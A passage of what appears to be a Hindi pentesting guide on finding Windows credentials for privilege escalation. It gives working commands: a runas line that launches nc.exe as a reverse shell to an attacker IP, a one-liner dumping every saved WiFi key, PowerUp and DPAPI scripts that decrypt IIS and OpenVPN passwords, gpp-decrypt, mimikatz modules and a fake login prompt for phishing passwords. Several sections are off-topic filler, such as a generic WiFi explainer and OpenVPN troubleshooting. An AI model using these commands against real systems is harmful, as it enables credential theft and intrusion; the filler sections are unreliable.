तब आप `/savecred` विकल्प के साथ `runas` का उपयोग कर सकते हैं ताकि सहेजे गए क्रेडेंशियल का उपयोग कर सकें। निम्नलिखित उदाहरण एक SMB शेयर के माध्यम से एक दूरस्थ बाइनरी को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
दिए गए प्रमाणपत्र के साथ `runas` का उपयोग करें।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1) से भी डेटा लीक हो सकता है।

### DPAPI

सिद्धांत में, डेटा संरक्षण API किसी भी प्रकार के डेटा के लिए सममित एन्क्रिप्शन सक्षम कर सकता है; वास्तविकता में, विंडोज ऑपरेटिंग सिस्टम में इसका प्राथमिक उपयोग असममित निजी कुंजीयों के सममित एन्क्रिप्शन को करने के लिए होता है, जहां उपयोगकर्ता या सिस्टम सीक्रेट एंट्रोपी के महत्वपूर्ण योगदान के रूप में उपयोग होता है।

**DPAPI विकासकों को उपयोगकर्ता के लॉगऑन सीक्रेट से उत्पन्न सममित कुंजी का उपयोग करके कुंजीयों को एन्क्रिप्ट करने की अनुमति देता है**, या सिस्टम एन्क्रिप्शन के मामले में, सिस्टम के डोमेन प्रमाणीकरण सीक्रेट का उपयोग करके।

उपयोगकर्ता की RSA कुंजीयों को एन्क्रिप्ट करने के लिए उपयोग होने वाली DPAPI कुंजी `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका में संग्रहीत की जाती है, जहां {SID} उपयोगकर्ता का [सुरक्षा पहचानकर्ता](https://en.wikipedia.org/wiki/Security\_Identifier) होता है। **DPAPI कुंजी उन उपयोगकर्ता की निजी कुंजीयों की सुरक्षा करने वाली मास्टर कुंजी के साथ ही एक ही फ़ाइल में संग्रहीत की जाती है**। यह आमतौर पर यादृच्छिक डेटा के 64 बाइट का होता है। (ध्यान दें कि यह निर्देशिका संरक्षित होती है, इसलिए आप इसे cmd से `dir` का उपयोग करके सूचीबद्ध नहीं कर सकते हैं, लेकिन आप PS से इसे सूचीबद्ध कर सकते हैं)।
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप **mimikatz मॉड्यूल** `dpapi::masterkey` का उपयोग कर सकते हैं उचित तरीके से (`/pvk` या `/rpc`) इसे डिक्रिप्ट करने के लिए।

मास्टर पासवर्ड द्वारा संरक्षित **क्रेडेंशियल फ़ाइलें** आमतौर पर इस स्थान पर स्थित होती हैं:
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप **mimikatz मॉड्यूल** `dpapi::cred` का उपयोग कर सकते हैं उचित `/masterkey` के साथ डिक्रिप्ट करने के लिए।\
आप **sekurlsa::dpapi** मॉड्यूल के साथ **मेमोरी** से कई DPAPI **मास्टरकी** निकाल सकते हैं (अगर आप रूट हैं)।

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell क्रेडेंशियल्स

**PowerShell क्रेडेंशियल्स** अक्सर **स्क्रिप्टिंग** और स्वचालन कार्यों के लिए उपयोग किए जाते हैं, जो एक सुरक्षित तरीके से एन्क्रिप्टेड क्रेडेंशियल्स को संग्रहीत करने के लिए होते हैं। क्रेडेंशियल्स को **DPAPI** का उपयोग करके सुरक्षित किया जाता है, जिसका मतलब होता है कि इन्हें सामान्यतः केवल उन्हीं उपयोगकर्ता द्वारा उन्हीं कंप्यूटर पर डिक्रिप्ट किया जा सकता है जहां वे बनाए गए थे।

इसमें से एक फ़ाइल में संग्रहीत PS क्रेडेंशियल्स को **डिक्रिप्ट** करने के लिए आप निम्नलिखित कर सकते हैं:
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाईफ़ाई

---

#### वाईफ़ाई क्या है?

वाईफ़ाई (WiFi) एक तकनीकी प्रोटोकॉल है जिसका उपयोग बिना तार के इंटरनेट कनेक्शन स्थापित करने के लिए किया जाता है। यह एक रेडियो तकनीक पर आधारित होता है जिसमें डेटा को वायरलेस रूप से ट्रांसमिट किया जाता है। वाईफ़ाई का उपयोग घर, ऑफिस, सार्वजनिक स्थानों और अन्य स्थानों में इंटरनेट एक्सेस प्रदान करने के लिए किया जाता है।

#### वाईफ़ाई हैकिंग

वाईफ़ाई हैकिंग एक प्रकार की साइबर हमला हो सकती है जिसमें हैकर वाईफ़ाई नेटवर्क के अनधिकृत रूप से उपयोग करते हैं और उसके द्वारा संचारित डेटा को अपने लाभ के लिए अपहरण करते हैं। इसके लिए, हैकर वाईफ़ाई नेटवर्क के सुरक्षा को उम्मीद से कम करते हैं और उपयोगकर्ताओं के डेटा और गोपनीयता को खतरे में डालते हैं।

#### वाईफ़ाई हैकिंग टेक्निक्स

वाईफ़ाई हैकिंग के लिए कई तकनीकी टेक्निक्स हो सकती हैं। यहां कुछ प्रमुख टेक्निक्स हैं:

- **वाईफ़ाई पासवर्ड क्रैकिंग**: इस टेक्निक का उपयोग करके हैकर वाईफ़ाई नेटवर्क के पासवर्ड को तोड़ सकते हैं और उसे अनधिकृत रूप से उपयोग कर सकते हैं।
- **वाईफ़ाई जामिंग**: इस टेक्निक का उपयोग करके हैकर वाईफ़ाई नेटवर्क को जाम कर सकते हैं, जिससे उपयोगकर्ताओं को इंटरनेट एक्सेस करने में समस्या हो सकती है।
- **वाईफ़ाई स्निफ़िंग**: इस टेक्निक का उपयोग करके हैकर वाईफ़ाई नेटवर्क के द्वारा संचारित डेटा को स्निफ़ कर सकते हैं और उसे अपहरण कर सकते हैं।
- **वाईफ़ाई फिशिंग**: इस टेक्निक का उपयोग करके हैकर वाईफ़ाई नेटवर्क के उपयोगकर्ताओं को धोखा देकर उनके गोपनीयता और खाता जानकारी को चुरा सकते हैं।

वाईफ़ाई हैकिंग एक गंभीर सुरक्षा समस्या है और उपयोगकर्ताओं को अपने वाईफ़ाई नेटवर्क की सुरक्षा को सुनिश्चित करने के लिए सतर्क रहना चाहिए।
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### सहेजे गए RDP कनेक्शन

आप उन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` पर ढूंढ सकते हैं\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में

### हाल ही में चलाए गए कमांड्स
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
उचित `/masterkey` के साथ **Mimikatz** `dpapi::rdg` मॉड्यूल का उपयोग करें ताकि किसी भी .rdg फ़ाइल को **डिक्रिप्ट** किया जा सके।\
आप **Mimikatz** `sekurlsa::dpapi` मॉड्यूल के साथ मेमोरी से कई DPAPI मास्टरकी निकाल सकते हैं।

### स्टिकी नोट्स

लोग अक्सर विंडोज वर्कस्टेशन पर स्टिकी नोट्स ऐप का उपयोग **पासवर्ड** और अन्य जानकारी सहेजने के लिए करते हैं, इसे एक डेटाबेस फ़ाइल मानते हुए नहीं। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित होती है और इसे खोजने और जांचने के लिए हमेशा महत्वपूर्ण होती है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से पासवर्ड पुनर्प्राप्त करने के लिए आपको व्यवस्थापक होना चाहिए और उच्च अवरोध स्तर के तहत चलाना चाहिए।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` निर्देशिका में स्थित होता है।\
यदि यह फ़ाइल मौजूद है तो संभावित है कि कुछ **प्रमाणीकरण** कॉन्फ़िगर किए गए हैं और पुनर्प्राप्त किए जा सकते हैं।

यह कोड _**PowerUP**_ से निकाला गया था:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है।\
इंस्टॉलर्स **SYSTEM विशेषाधिकारों के साथ चलाए जाते हैं**, बहुत सारे **DLL Sideloading (जानकारी** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**) के प्रति संक्रमित हो सकते हैं।**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (क्रेडेंशियल)

### पुटी क्रेडेंशियल्स
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजी

Putty SSH होस्ट कुंजी एक खुला स्रोत एप्लिकेशन है जिसका उपयोग SSH कनेक्शन की सुरक्षा बढ़ाने के लिए किया जाता है। जब आप Putty का उपयोग करके किसी रिमोट सर्वर पर SSH कनेक्शन स्थापित करते हैं, तो Putty आपको उस सर्वर के साथ सुरक्षित रूप से कनेक्ट होने के लिए एक होस्ट कुंजी देता है।

Putty SSH होस्ट कुंजी को आपके सिस्टम में रखा जाता है और जब आप उसी सर्वर पर बाद में फिर से कनेक्ट होते हैं, तो Putty यह सुनिश्चित करता है कि आप वही सर्वर हैं जिसके साथ पहले से कनेक्ट हुए थे। इसके लिए, Putty उसी होस्ट कुंजी का उपयोग करता है जो पहले से ही सिस्टम में मौजूद होती है।

यदि किसी कारणवश, Putty SSH होस्ट कुंजी लीक हो जाती है, तो कोई भी अनधिकृत उपयोगकर्ता आपके सिस्टम पर आपके नाम से SSH कनेक्शन स्थापित कर सकता है और आपके सिस्टम को नुकसान पहुंचा सकता है। इसलिए, यह महत्वपूर्ण है कि आप अपनी Putty SSH होस्ट कुंजी को सुरक्षित रखें और उसे किसी अनधिकृत उपयोगकर्ता के हाथों में न छोड़ें।
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH कुंजी

SSH निजी कुंजी रजिस्ट्री कुंजी `HKCU\Software\OpenSSH\Agent\Keys` में संग्रहीत की जा सकती है, इसलिए आपको जांचना चाहिए कि वहां कुछ दिलचस्प है या नहीं:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
यदि आप उस पथ में कोई एंट्री खोजते हैं तो यह संभवतः एक सहेजी गई SSH कुंजी होगी। यह एन्क्रिप्टेड रूप में संग्रहीत होती है लेकिन [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) का उपयोग करके आसानी से डिक्रिप्ट किया जा सकता है।\
इस तकनीक के बारे में अधिक जानकारी यहां मिलेगी: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` सेवा चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वचालित रूप से शुरू हो, तो निम्नलिखित को चलाएं:
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
ऐसा लगता है कि यह तकनीक अब वैध नहीं है। मैंने कुछ SSH कुंजी बनाने की कोशिश की, उन्हें `ssh-add` के साथ जोड़ा और SSH के माध्यम से एक मशीन में लॉगिन किया। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने विषमांक कुंजी प्रमाणीकरण के दौरान `dpapi.dll` का उपयोग नहीं किया है।
{% endhint %}

### अनदेखी फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **मेटास्प्लोइट** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum\_unattend_

उदाहरण सामग्री\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM और SYSTEM बैकअप

जब हम विंडोज प्रणाली में स्थानीय प्रिविलेज उन्नयन करने की कोशिश करते हैं, तो हमें SAM और SYSTEM बैकअप की जांच करनी चाहिए।

SAM फ़ाइल उपयोगकर्ता खातों के लिए प्रमाणीकरण जानकारी संग्रहित करती है, जबकि SYSTEM फ़ाइल विंडोज प्रणाली के लिए महत्वपूर्ण कॉन्फ़िगरेशन और सुरक्षा सेटिंग्स संग्रहित करती है।

इन बैकअप फ़ाइलों को उपयोग करके, हम संग्रहीत पासवर्ड और अन्य प्रमाणीकरण जानकारी को उद्धृत कर सकते हैं और इसे उन्नयन के लिए उपयोग कर सकते हैं।

इन बैकअप फ़ाइलों को प्राप्त करने के लिए, हमें विंडोज प्रणाली के लिए उपयोग किए जाने वाले उपकरणों का उपयोग करना होगा, जैसे कि `regedit`, `reg save`, या `reg save hklm\sam sam`।

इसके अलावा, हमें इन बैकअप फ़ाइलों को उद्धृत करने के लिए उपयोगकर्ता के लिए उचित अनुमतियों की आवश्यकता होगी। इसलिए, हमें उपयोगकर्ता के लिए उचित अनुमतियों को प्राप्त करने की कोशिश करनी चाहिए।

एक बार जब हमें इन बैकअप फ़ाइलों को प्राप्त कर लिया होता है, हम उन्हें अनुकरण करके उपयोगकर्ता के पासवर्ड को उद्धृत कर सकते हैं और उन्नयन के लिए उपयोग कर सकते हैं।
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स

Cloud credentials are the authentication details used to access cloud services and resources. These credentials typically include a username and password, API keys, access tokens, or certificates. It is important to protect cloud credentials as they grant access to sensitive data and resources in the cloud environment.

#### Best Practices for Securing Cloud Credentials

1. **Use Strong and Unique Passwords**: Create strong and unique passwords for each cloud service account. Avoid using common or easily guessable passwords.

2. **Enable Multi-Factor Authentication (MFA)**: Enable MFA for all cloud service accounts to add an extra layer of security. MFA requires users to provide additional verification, such as a code sent to their mobile device, in addition to their password.

3. **Regularly Rotate Credentials**: Change passwords and access keys regularly to minimize the risk of unauthorized access. This is especially important when employees leave the organization or when credentials have been compromised.

4. **Implement Least Privilege**: Grant users the minimum level of access necessary to perform their tasks. Avoid giving unnecessary administrative privileges to reduce the potential impact of a compromised account.

5. **Securely Store and Transmit Credentials**: Store credentials in a secure password manager or vault. Avoid storing credentials in plain text or sharing them through insecure channels like email or messaging apps.

6. **Monitor and Audit Credential Usage**: Regularly monitor and review the usage of cloud credentials. Implement logging and auditing mechanisms to detect any suspicious activities or unauthorized access attempts.

7. **Regularly Update and Patch Cloud Services**: Keep cloud services and applications up to date with the latest security patches and updates. This helps protect against known vulnerabilities that could be exploited to gain unauthorized access.

By following these best practices, you can help ensure the security of your cloud credentials and minimize the risk of unauthorized access to your cloud resources.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल ढूंढें जिसका नाम **SiteList.xml** है।

### कैश किए गए GPP पासवर्ड

KB2928120 से पहले (MS14-025 देखें), कुछ ग्रुप नीति वरीयताएँ एक कस्टम खाते के साथ कॉन्फ़िगर की जा सकती थी। इस सुविधा का मुख्य उपयोग एक समूह में कस्टम स्थानीय प्रशासक खाता डिप्लॉय करने के लिए किया जाता था। हालांकि, इस दृष्टिकोण में दो समस्याएं थीं। पहली बात यह है कि, क्योंकि ग्रुप नीति ऑब्जेक्ट XML फ़ाइलें SYSVOL में संग्रहीत होती हैं, किसी भी डोमेन उपयोगकर्ता उन्हें पढ़ सकता है। दूसरी समस्या यह है कि इन GPP में सेट किए गए पासवर्ड को डिफ़ॉल्ट कुंजी के साथ AES256-एन्क्रिप्ट किया जाता है, जो सार्वजनिक रूप से दस्तावेज़ीकृत है। इसका मतलब है कि किसी भी प्रमाणित उपयोगकर्ता को संभावित रूप से बहुत संवेदनशील डेटा तक पहुंच मिल सकती है और वे अपनी मशीन या यहां तक कि डोमेन पर अपनी प्रभुता बढ़ा सकते हैं। यह फ़ंक्शन जांचेगा कि क्या कोई भी स्थानीय रूप से कैश किए गए GPP फ़ाइल में एक गैर-खाली "cpassword" फ़ील्ड है। यदि हां, तो यह इसे डिक्रिप्ट करेगा और फ़ाइल के स्थान के साथ कुछ जानकारी शामिल करते हुए एक कस्टम पीएस ऑब्जेक्ट लौटाएगा।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**cPassword को डिक्रिप्ट करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
क्रैकमैपेक्सेक का उपयोग करके पासवर्ड प्राप्त करना:
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग

IIS वेब कॉन्फ़िग एक XML फ़ाइल है जो IIS (इंटरनेट इनफ़ोर्मेशन सेवाएं) कॉन्फ़िगरेशन सेटिंग्स को संग्रहीत करती है। यह फ़ाइल IIS वेब सर्वर के विभिन्न विशेषताओं को कॉन्फ़िगर करने के लिए उपयोग की जाती है, जैसे वेब साइटों, वर्चुअल डायरेक्टरी, और ऐप पूल।

इस फ़ाइल में विभिन्न सेक्शन होते हैं जो विभिन्न कॉन्फ़िगरेशन सेटिंग्स को प्रदान करते हैं, जैसे वेब साइट का नाम, फ़ाइल संग्रहण स्थान, अनुमतियाँ, और अन्य सेटिंग्स। इन सेक्शनों को आपको संपादित करके वेब सर्वर की कॉन्फ़िगरेशन में परिवर्तन कर सकते हैं।

इसके अलावा, IIS वेब कॉन्फ़िग फ़ाइल में सुरक्षा सेटिंग्स भी होती हैं जो वेब सर्वर को सुरक्षित रखने में मदद करती हैं। इन सेटिंग्स को संपादित करके आप वेब सर्वर की सुरक्षा को बढ़ा सकते हैं और लोकल प्रिविलेज एस्केलेशन के लिए उपयोग किए जा सकते हैं।

यदि आपको लोकल प्रिविलेज एस्केलेशन की जांच करनी है, तो आप IIS वेब कॉन्फ़िग फ़ाइल को जांच सकते हैं और किसी भी सेटिंग्स को संपादित करके लोकल प्रिविलेज एस्केलेशन के लिए उपयोग कर सकते हैं।
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
योग्यता वाले web.config का उदाहरण:
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स

To establish a secure connection with an OpenVPN server, you will need the following credentials:

- **Username**: उपयोगकर्ता नाम
- **Password**: पासवर्ड

These credentials are provided by the OpenVPN server administrator. Make sure to keep them confidential and do not share them with anyone.

### OpenVPN साधारण समस्याएं

यदि आपको OpenVPN के साथ किसी भी सामान्य समस्या का सामना करना पड़ता है, तो निम्नलिखित चरणों का पालन करें:

1. **सर्वर कनेक्शन की जांच करें**: सर्वर कनेक्शन की जांच करें और सुनिश्चित करें कि सर्वर सही ढंग से कॉन्फ़िगर किया गया है।
2. **क्रेडेंशियल्स की जांच करें**: अपने उपयोगकर्ता नाम और पासवर्ड की जांच करें और सुनिश्चित करें कि वे सही हैं।
3. **फ़ायरवॉल की सेटिंग्स की जांच करें**: अपने फ़ायरवॉल की सेटिंग्स की जांच करें और सुनिश्चित करें कि OpenVPN कनेक्शन को ब्लॉक नहीं किया जा रहा है।
4. **सर्वर लॉग फ़ाइल की जांच करें**: सर्वर लॉग फ़ाइल की जांच करें और समस्या का कारण खोजें।
5. **अपडेट करें**: OpenVPN को नवीनतम संस्करण में अपडेट करें, यह समस्याओं को हल कर सकता है।

यदि आपकी समस्या अभी भी हल नहीं होती है, तो आपको अपने OpenVPN सर्वर व्यवस्थापक से संपर्क करना चाहिए।
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग

Logs are records of events or actions that have occurred on a system. They can provide valuable information for troubleshooting, monitoring, and security purposes. In the context of local privilege escalation on Windows systems, logs can be a useful resource for identifying potential vulnerabilities and attack vectors.

Windows systems generate various types of logs, including event logs, security logs, and application logs. These logs can contain information about user activities, system events, network connections, and more. By analyzing these logs, you can gain insights into the system's behavior and identify any suspicious or unauthorized activities.

To access and analyze logs on a Windows system, you can use tools such as Event Viewer, PowerShell, or third-party log management solutions. It is important to regularly review and monitor logs to detect any signs of unauthorized access or privilege escalation attempts.

In the context of local privilege escalation, logs can help in identifying any unusual or unexpected activities that may indicate an ongoing attack. For example, you can look for log entries related to the creation or modification of user accounts, changes to system configurations, or failed login attempts. By analyzing these logs, you can identify potential security weaknesses and take appropriate measures to mitigate them.

In summary, logs play a crucial role in local privilege escalation on Windows systems. By regularly reviewing and analyzing logs, you can detect and respond to potential security threats in a timely manner.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### क्रेडेंशियल्स के लिए पूछें

आप हमेशा **उपयोगकर्ता से उनके क्रेडेंशियल्स या एक अलग उपयोगकर्ता के क्रेडेंशियल्स पूछ सकते हैं** अगर आपको लगता है कि उसे उनके बारे में पता हो सकता है (ध्यान दें कि **क्रेडेंशियल्स** के लिए ग्राहक से **पूछना** वास्तव में **जोखिमपूर्ण** होता है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **पासवर्ड समेत क्रेडेंशियल्स सम्बन्धी संभावित फ़ाइलों के नाम**

ज्ञात फ़ाइलें जिनमें कुछ समय पहले **पासवर्ड** साफ-साफ या **Base64** में शामिल थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
उपस्थित सभी प्रस्तावित फ़ाइलों को खोजें:
```
cd C:\
